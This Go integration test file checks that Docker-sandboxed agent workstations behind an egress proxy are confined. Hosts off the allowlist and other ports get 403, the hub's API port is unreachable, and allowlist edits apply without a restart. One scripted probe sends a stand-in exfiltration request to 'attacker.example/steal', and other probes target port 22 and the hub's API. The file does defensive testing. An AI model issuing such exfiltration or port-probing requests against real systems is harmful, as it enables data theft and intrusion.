//go:build integration

package itest

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"testing"
	"time"
)

// dockerEgressAllowlist is the evidence #193 asked for: from inside a
// workstation, a host off the allowlist is refused and one on it is reached.
// Two loops of the same fleet, behind the same proxy, so the difference
// between them is the allowlist and nothing else.
func dockerEgressAllowlist(t *testing.T) {
	allowed := startHostReachableServer(t)

	// The stand-in host is allowlisted the way an operator would allowlist
	// one: by entry, host and port together.
	s := startDockerServer(t, t.TempDir(),
		"--egress-allow", fmt.Sprintf("host.docker.internal:%d", allowed))
	s.createLoop("wsegress", nil)
	view := s.loop("wsegress")
	cleanupWorkstation(t, view.ID)

	// The proxy holds the gateway alias (that is how a loop reaches the hub),
	// so a server on the operator's own machine stands in for "a host we
	// permit" without the test needing the internet. The
	// probe is scripted rather than messaged: a directive only acts when the
	// fake is running it as its own turn, not when it arrives as text.
	s.scriptLoop("wsegress", fmt.Sprintf("!get http://host.docker.internal:%d/ok\n", allowed))
	s.message("wsegress", "reach out")
	reached := s.waitTurn("wsegress", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "get http://host.docker.internal")
	})
	if !strings.Contains(reached.ResultText, "200 OK") {
		t.Fatalf("an allowlisted host must be reachable through the proxy, got:\n%s", reached.ResultText)
	}

	// A second loop for the second probe: a loop's script is one line for
	// every turn of its life, so two probes are two loops.
	s.createLoop("wsblocked", nil)
	cleanupWorkstation(t, s.loop("wsblocked").ID)
	s.scriptLoop("wsblocked", "!get http://attacker.example/steal\n")
	s.message("wsblocked", "reach out")
	refused := s.waitTurn("wsblocked", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "attacker.example")
	})
	if !strings.Contains(refused.ResultText, "403 Forbidden") {
		t.Fatalf("a host off the allowlist must be refused, got:\n%s", refused.ResultText)
	}

	// And the allowlist is host *and* port: the same gateway that answered on
	// the entry's port is refused on another, so an entry the fleet needs —
	// the hub's — is not a tunnel to ssh or a database on the operator's
	// machine.
	s.createLoop("wsport", nil)
	cleanupWorkstation(t, s.loop("wsport").ID)
	s.scriptLoop("wsport", "!get http://host.docker.internal:22/\n")
	s.message("wsport", "reach out")
	otherPort := s.waitTurn("wsport", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "host.docker.internal:22")
	})
	if !strings.Contains(otherPort.ResultText, "403 Forbidden") {
		t.Fatalf("an allowlisted host on another port must be refused, got:\n%s", otherPort.ResultText)
	}

	// The refusal has to be the network's doing, not the proxy's goodwill:
	// the workstation is on the internal network, which has no route out at
	// all, so a client that ignores HTTP_PROXY gets nowhere either.
	network, err := dockerInspect(
		"{{range $net, $_ := .NetworkSettings.Networks}}{{$net}} {{end}}", "spool-ws-"+view.ID)
	if err != nil || strings.TrimSpace(network) != egressTestImage {
		t.Fatalf("workstation networks = %q (%v), want only %q", network, err, egressTestImage)
	}
	out, err := exec.Command("docker", "network", "inspect", "--format", "{{.Internal}}", egressTestImage).CombinedOutput()
	if internal := strings.TrimSpace(string(out)); err != nil || internal != "true" {
		t.Fatalf("egress network internal = %q (%v), want true", internal, err)
	}
}

// startHostReachableServer serves 200 on every path, bound to every interface
// so a container reaching the host gateway finds it — the harness's own API
// listens on loopback only, which nothing inside the wall can reach.
func startHostReachableServer(t *testing.T) int {
	t.Helper()
	listener, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	srv.Listener.Close()
	srv.Listener = listener
	srv.Start()
	t.Cleanup(srv.Close)
	return listener.Addr().(*net.TCPAddr).Port
}

// dockerWorkstationCannotReachTheAPI is the L1 safety claim itself (#238):
// from inside a real workstation, behind the real wall, the hub's loop-facing
// port answers and the hub's API port does not exist as a destination. The
// probe runs as the loop's own turn, which is the position an attacker
// steering a loop would actually be in.
func dockerWorkstationCannotReachTheAPI(t *testing.T) {
	s := startDockerServer(t, t.TempDir())

	// The API port is on no allowlist, so the proxy refuses it before it
	// dials anything: the loop never gets to find out the API is unauthenticated.
	s.createLoop("wsapi", nil)
	cleanupWorkstation(t, s.loop("wsapi").ID)
	s.scriptLoop("wsapi", fmt.Sprintf("!get http://host.docker.internal:%s/api/loops\n", s.port(s.baseURL)))
	s.message("wsapi", "reach the hub")
	api := s.waitTurn("wsapi", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "/api/loops")
	})
	if !strings.Contains(api.ResultText, "403 Forbidden") {
		t.Fatalf("a workstation must not reach the hub's API port, got:\n%s", api.ResultText)
	}

	// The MCP port is allowlisted, because a loop that cannot reach it cannot
	// take a turn. The 404 is the proof of both halves at once: the request
	// got through the wall to the hub's own process, and that process routes
	// no API path here.
	s.createLoop("wsmcp", nil)
	cleanupWorkstation(t, s.loop("wsmcp").ID)
	s.scriptLoop("wsmcp", fmt.Sprintf("!get http://host.docker.internal:%s/api/loops\n", s.port(s.mcpURL)))
	s.message("wsmcp", "reach the hub")
	viaMCPPort := s.waitTurn("wsmcp", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "/api/loops")
	})
	if !strings.Contains(viaMCPPort.ResultText, "404 Not Found") {
		t.Fatalf("the mcp port must be reachable and serve no API, got:\n%s", viaMCPPort.ResultText)
	}

	// Reachable is not the claim; usable is. This loop makes the call its own
	// runner configured for it — an MCP send_message to the endpoint the hub
	// handed it — so the port that answers 404 for an API path answers the
	// one thing it is there for, through the wall and the default allowlist
	// entry rather than anything this test arranged.
	s.createLoop("wssend", nil)
	cleanupWorkstation(t, s.loop("wssend").ID)
	s.scriptLoop("wssend", `!send {"destination":"control_room","text":"through the wall"}`+"\n")
	s.message("wssend", "say something")
	sent := s.waitTurn("wssend", 90*time.Second, func(tr turn) bool {
		return strings.Contains(tr.ResultText, "sent") || strings.Contains(tr.ResultText, "send error")
	})
	if !strings.Contains(sent.ResultText, "sent") || strings.Contains(sent.ResultText, "send error") {
		t.Fatalf("a workstation must reach the hub's MCP endpoint, got:\n%s", sent.ResultText)
	}
}

// dockerLoopReachesItsMCPServerThroughTheHub is #622's evidence behind the
// wall: a docker loop calls an attached http MCP server through the hub's
// loop listener, the server never sees the loop's hub token, and the
// server's host is never opened to the workstation, which reaching it
// directly shows. The hub dials the server at the docker bridge's gateway,
// an address off loopback, as it would a server on the network; the
// connection carries no secret, because plain http off the host may not.
func dockerLoopReachesItsMCPServerThroughTheHub(t *testing.T) {
	tracker := startBrokeredServer(t, "0.0.0.0:0")
	out, err := exec.Command("docker", "network", "inspect", "bridge", "--format", "{{(index .IPAM.Config 0).Gateway}}").CombinedOutput()
	gateway := strings.TrimSpace(string(out))
	if err != nil || net.ParseIP(gateway) == nil {
		t.Fatalf("docker bridge gateway = %q (%v)", gateway, err)
	}
	s := startDockerServer(t, t.TempDir())
	s.mustJSON("POST", "/api/connections", map[string]any{
		"name": "tracker", "kind": "mcp-server",
		"config": map[string]any{"transport": "http", "url": fmt.Sprintf("http://%s/mcp", net.JoinHostPort(gateway, fmt.Sprint(tracker.port)))},
	}, nil)
	s.createLoop("wsholder", nil)
	cleanupWorkstation(t, s.loop("wsholder").ID)
	s.mustJSON("PUT", "/api/loops/wsholder/connections/tracker", nil, nil)

	s.scriptLoop("wsholder", "!mcp tracker ping\n")
	s.message("wsholder", "call it")
	called := s.waitTurn("wsholder", 90*time.Second, func(tr turn) bool { return strings.HasPrefix(tr.ResultText, "mcp tracker:") })
	if called.ResultText != "mcp tracker: pong" {
		t.Fatalf("a docker loop must reach its server through the hub, got:\n%s", called.ResultText)
	}
	for _, auth := range tracker.seen() {
		if auth != "" {
			t.Fatalf("the server was sent Authorization %q, want none: the loop's hub token is the hub's alone", auth)
		}
	}

	s.scriptLoop("wsholder", fmt.Sprintf("!get http://host.docker.internal:%d/mcp\n", tracker.port))
	s.message("wsholder", "reach out")
	direct := s.waitTurn("wsholder", 90*time.Second, func(tr turn) bool { return strings.Contains(tr.ResultText, "get http://host.docker.internal") })
	if !strings.Contains(direct.ResultText, "403 Forbidden") {
		t.Fatalf("the server's host must stay closed to the workstation, got:\n%s", direct.ResultText)
	}
}

// dockerEgressHostsApplyLive is #542's evidence: an extra host added
// through the settings API lets a loop's next request through the running
// proxy, and removing it refuses the one after, with no hub restart and the same proxy
// container throughout. The host is under .invalid, so a request the
// allowlist lets through fails at the proxy's resolver (502) and one it
// refuses never gets that far (403): the status code is the allowlist's
// answer, without the test needing the internet.
func dockerEgressHostsApplyLive(t *testing.T) {
	s := startDockerServer(t, t.TempDir())
	s.createLoop("wslive", nil)
	cleanupWorkstation(t, s.loop("wslive").ID)
	reach := func(after string) turn {
		t.Helper()
		s.scriptLoop("wslive", "!get http://pkg.spool-itest.invalid/\n")
		s.message("wslive", "reach out")
		return s.waitTurn("wslive", 90*time.Second, func(tr turn) bool {
			return tr.ID != after && strings.Contains(tr.ResultText, "pkg.spool-itest.invalid")
		})
	}
	before := reach("")
	if !strings.Contains(before.ResultText, "403 Forbidden") {
		t.Fatalf("a host on no list must be refused, got:\n%s", before.ResultText)
	}
	proxyID, err := dockerInspect("{{.Id}}", egressTestImage+"-proxy")
	if err != nil {
		t.Fatal(err)
	}

	type egressView struct {
		Enforced bool `json:"enforced"`
		BuiltIn  []struct {
			Hosts []string `json:"hosts"`
		} `json:"built_in"`
		Extra     []string `json:"extra"`
		ChangedAt int64    `json:"changed_at"`
		AppliedAt int64    `json:"applied_at"`
	}
	// A port is the terminal's decision, not the API's.
	if resp, body := s.do("POST", "/api/settings/egress/hosts", map[string]string{"host": "pkg.spool-itest.invalid:8443"}); resp.StatusCode != http.StatusBadRequest ||
		!strings.Contains(string(body), `"egress_host_invalid"`) {
		t.Fatalf("adding a host with a port = %d %s, want 400 egress_host_invalid", resp.StatusCode, body)
	}
	var added egressView
	s.mustJSON("POST", "/api/settings/egress/hosts", map[string]string{"host": "PKG.spool-itest.invalid"}, &added)
	if !added.Enforced || len(added.Extra) != 1 || added.Extra[0] != "pkg.spool-itest.invalid" {
		t.Fatalf("view after the add = %+v, want the canonical host, enforced", added)
	}
	if added.AppliedAt < added.ChangedAt {
		t.Fatalf("applied_at %d before changed_at %d: a running proxy must take the list in the request", added.AppliedAt, added.ChangedAt)
	}
	gateway := added.BuiltIn[len(added.BuiltIn)-1].Hosts
	if len(gateway) != 1 || gateway[0] != "host.docker.internal:"+s.port(s.mcpURL) {
		t.Fatalf("the last built-in group = %q, want the hub's gateway entry", gateway)
	}

	through := reach(before.ID)
	if !strings.Contains(through.ResultText, "502 Bad Gateway") {
		t.Fatalf("an added host must pass the allowlist with no restart, got:\n%s", through.ResultText)
	}

	var removed egressView
	s.mustJSON("DELETE", "/api/settings/egress/hosts/pkg.spool-itest.invalid", nil, &removed)
	if len(removed.Extra) != 0 {
		t.Fatalf("view after the remove = %+v, want no extra hosts", removed)
	}
	if after := reach(through.ID); !strings.Contains(after.ResultText, "403 Forbidden") {
		t.Fatalf("a removed host must be refused again, got:\n%s", after.ResultText)
	}
	if id, err := dockerInspect("{{.Id}}", egressTestImage+"-proxy"); err != nil || id != proxyID {
		t.Fatalf("proxy container %q (%v), want %q: changing the hosts must not recreate it", id, err, proxyID)
	}
}

// dockerEgressHostReachesASurvivingProxy is #657's evidence: a hub run
// whose workstation and proxy both survived from the last run, as every
// restart of a working fleet leaves them, still gets a host added on
// Settings into the proxy by the next docker wake. The run's first wake
// finds the workstation running, provisions nothing, and is the hub's first
// chance to write the proxy's file this run.
func dockerEgressHostReachesASurvivingProxy(t *testing.T) {
	dataDir := t.TempDir()
	s := startDockerServer(t, dataDir)
	s.createLoop("wssurvivor", nil)
	cleanupWorkstation(t, s.loop("wssurvivor").ID)
	s.scriptLoop("wssurvivor", "!get http://uploads.spool-itest.invalid/\n")
	s.stop()

	s = startDockerServer(t, dataDir)
	t.Cleanup(func() {
		// the proxy is shared by every row on the image: leave it as found
		s.do("DELETE", "/api/settings/egress/hosts/uploads.spool-itest.invalid", nil)
	})
	type egressView struct {
		ChangedAt int64 `json:"changed_at"`
		AppliedAt int64 `json:"applied_at"`
	}
	var added egressView
	s.mustJSON("POST", "/api/settings/egress/hosts", map[string]string{"host": "uploads.spool-itest.invalid"}, &added)

	// the first run's wake already ran the script and got 403, and its turn
	// is in the shared data dir: only a turn begun after the add counts
	earlier := map[string]bool{}
	for _, tr := range s.turns("wssurvivor") {
		earlier[tr.ID] = true
	}
	s.message("wssurvivor", "reach out")
	reached := s.waitTurn("wssurvivor", 90*time.Second, func(tr turn) bool {
		return !earlier[tr.ID] && strings.Contains(tr.ResultText, "uploads.spool-itest.invalid")
	})
	if !strings.Contains(reached.ResultText, "502 Bad Gateway") {
		t.Fatalf("a host added on Settings must pass the surviving proxy by the next wake, got:\n%s", reached.ResultText)
	}
	var after egressView
	s.mustJSON("GET", "/api/settings/egress", nil, &after)
	if after.AppliedAt < added.ChangedAt {
		t.Fatalf("applied_at %d before changed_at %d after the wake that copied the list", after.AppliedAt, added.ChangedAt)
	}
}
